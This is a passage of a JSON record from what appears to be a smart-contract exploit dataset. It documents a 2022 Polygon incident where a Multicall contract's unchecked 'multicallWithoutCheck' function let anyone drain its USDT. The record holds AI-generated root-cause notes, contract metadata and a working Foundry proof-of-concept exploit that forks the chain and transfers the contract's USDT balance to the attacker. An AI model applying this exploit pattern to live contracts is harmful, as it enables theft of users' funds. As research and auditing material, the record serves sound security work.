es this malicious `transfer` function, draining the USDT from the vulnerable contract.", "ai_mitigation": [], "ai_root_cause": "The `multicallWithoutCheck` function lacks input validation, allowing arbitrary contract calls.", "ai_vulnerability_type": "Unchecked External Call", "attack_title": "MulticallWithoutCheck_exp", "contracts": [{"abi_available": true, "address": "0x940ce652a51ebadb5df09d605dbeda95fdcf697b", "artifact_dir": "data/contracts/2022_10_multicallwithoutcheck/contracts/01_vulnerable_940ce652_multicall", "bytecode_available": true, "chain": {"id": 137, "name": "Polygon"}, "compiler_version": "v0.8.17+commit.8df45f5f", "contract_name": "Multicall", "explorer_url": "https://polygonscan.com/address/0x940ce652a51ebadb5df09d605dbeda95fdcf697b", "fetch_error": null, "is_verified": true, "proxy": {"admin_address": null, "implementation_address": null, "is_proxy": false, "proxy_type": null, "resolution_depth": 0, "resolved_at": "2026-04-10T06:32:03.382Z"}, "role": "vulnerable", "source_available": true, "source_files": ["data/contracts/2022_10_multicallwithoutcheck/contracts/01_vulnerable_940ce652_multicall/sources/contracts/Multicall.sol", "data/contracts/2022_10_multicallwithoutcheck/contracts/01_vulnerable_940ce652_multicall/sources/contracts/interfaces/IERC20.sol"], "source_hint": "AI extracted: The `multicallWithoutCheck` function in the `Target` contract allows arbitrary calls to other contracts without proper validation. This can be exploited to drain tokens by making a `transfer` call to the USDT contract, effectively transferring all USDT held by the `Target` contract to the attacker's address.", "verification_status": "verified"}], "contracts_dir": "data/contracts/2022_10_multicallwithoutcheck", "id": "2022_10_multicallwithoutcheck", "metadata": {"ai_enabled": true, "ai_model": "gemini-2.5-flash-lite|gemini-2.5-flash-lite", "dataset_version": "1.0.0", "poc_parser_version": "1.0.0", "processed_at": "2026-04-10T06:32:04.996Z"}, "num_bytecode_contracts": 1, "num_contracts": 1, "num_source_contracts": 1, "num_verified_contracts": 1, "poc_code": "// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// Address https://polygonscan.com/address/0x940ce652a51ebadb5df09d605dbeda95fdcf697b
interface Target {
    struct Call {
        address target;
        bytes callData;
        uint256 value;
    }

    function multicallWithoutCheck(
        Call[] memory calls
    ) external;
}

contract ContractTest is Test {
    struct Call {
        address target;
        bytes callData;
        uint256 value;
    }

    Target target = Target(0x940cE652A51EBadB5dF09d605dBEDA95fDcF697b);
    IERC20 USDT = IERC20(0xc2132D05D31c914a87C6611C10748AEb04B58e8F);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("polygon", 34_743_770);
    }

    function testExploit() public {
        uint256 USDTBlance = USDT.balanceOf(address(target));
        bytes memory data = abi.encodeWithSignature("transfer(address,uint256)", address(this), USDTBlance);
        Target.Call memory inputData = Target.Call({target: address(USDT), callData: data, value: 0});
        Target.Call[] memory calls = new Target.Call[](1);
        calls[0] = inputData;
        target.multicallWithoutCheck(calls);

        emit log_named_decimal_uint("[End] Attacker USDT balance after exploit", USDT.balanceOf(address(this)), 6);
    }
}
